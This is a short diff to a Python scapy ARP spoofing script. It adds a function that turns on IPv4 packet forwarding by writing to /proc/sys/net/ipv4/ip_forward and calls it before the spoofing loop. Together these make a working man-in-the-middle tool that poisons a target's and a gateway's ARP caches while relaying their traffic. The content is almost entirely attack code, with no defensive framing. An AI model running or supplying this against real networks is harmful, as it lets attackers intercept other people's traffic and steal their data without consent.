@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
-import time, sys, argparse
+import time, sys, argparse, subprocess
 
 def get_arguments():
     parser = argparse.ArgumentParser()
@@ -13,6 +13,19 @@ def get_arguments():
     elif not args.gateway:
         parser.error("[-] Specify gateway IP, use --help for more info")
     return args
+
+def enable_forwarding():
+    print("[+] Checking packet forwarding...")
+    output = subprocess.check_output(["/bin/cat", "/proc/sys/net/ipv4/ip_forward"])
+    if output == "1\n":
+        print("[+] Done.")
+    elif output == "0\n":
+        print("[+] Enabling packet forwarding...")
+        f = open('/proc/sys/net/ipv4/ip_forward', 'w')
+        f.write("1")
+        f.close()
+        #subprocess.call(["/bin/echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"], shell=False, stdout=subprocess.PIPE)
+        print("[+] Done.")
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -39,6 +52,7 @@ target_mac = get_mac(target_ip)
 gateway_mac = get_mac(gateway_ip)
 
 try:
+    enable_forwarding()
     sent_packets_count = 0
     while True: 
         spoof(target_ip, gateway_ip, target_mac)
